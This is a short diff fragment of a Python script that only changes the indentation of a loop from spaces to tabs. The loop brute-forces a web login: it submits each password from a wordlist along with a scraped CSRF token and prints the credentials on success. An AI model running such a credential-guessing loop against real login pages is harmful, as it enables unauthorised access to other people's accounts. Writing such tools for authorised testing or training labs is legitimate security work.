@@ -42,26 +42,26 @@ csrf = soup("input", {"name": "csrf"})[0]["value"]
 # Post Request
 for password in passwordfile: 
 	# Create the post data arguments 
-    login = {
-        "csrf": csrf,
-        "user_name": username,
-        "user_password": password,
-        "action": "login"
-    }
+	login = {
+		"csrf": csrf,
+		"user_name": username,
+		"user_password": password,
+		"action": "login"
+	}
 
 	# Post request Execution
-    r = s.post(url,data=login)
+	r = s.post(url,data=login)
 
 	# Validate if Login was successful or not 
-    if "The information is incorrect" in r.text:
+	if "The information is incorrect" in r.text:
 		# Uncomment to view fail attempts
-        #print("login Fail with password: " + password)
+		#print("login Fail with password: " + password)
 		None
-    else:
-        print("[+] Login Success!")
-        print("[+] Username: " + username)
-        print("[+] Password: " + password)
-        break
+	else:
+		print("[+] Login Success!")
+		print("[+] Username: " + username)
+		print("[+] Password: " + password)
+		break
 
 
 """
